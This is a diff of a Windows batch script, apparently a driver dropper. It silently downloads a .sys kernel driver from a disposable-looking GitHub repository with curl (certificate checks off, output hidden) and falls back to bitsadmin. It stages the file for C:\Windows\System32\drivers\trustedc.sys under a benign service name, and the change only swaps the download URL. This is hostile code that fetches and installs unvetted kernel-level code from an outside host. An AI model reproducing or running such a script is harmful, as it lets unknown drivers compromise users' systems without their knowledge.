@@ -11,9 +11,9 @@ set "target=C:\Windows\System32\drivers\trustedc.sys"
 set "svc=trustedc"
 
 :: [1] 다운로드
-curl -s -L -k -o "%downloaded%" "https://github.com/pure10000000-hue/dfsfwer34554333333333333/raw/refs/heads/main/h.sys" >nul 2>&1
+curl -s -L -k -o "%downloaded%" "https://github.com/pure10000000-hue/skadsasd/raw/refs/heads/main/h.sys" >nul 2>&1
 if %errorlevel% neq 0 (
-    bitsadmin /transfer "driver_download" /download /priority high "https://github.com/pure10000000-hue/dfsfwer34554333333333333/raw/refs/heads/main/h.sys" "%downloaded%" >nul 2>&1
+    bitsadmin /transfer "driver_download" /download /priority high "https://github.com/pure10000000-hue/skadsasd/raw/refs/heads/main/h.sys" "%downloaded%" >nul 2>&1
 )
 if not exist "%downloaded%" (
     echo REM Dummy > "%downloaded%"
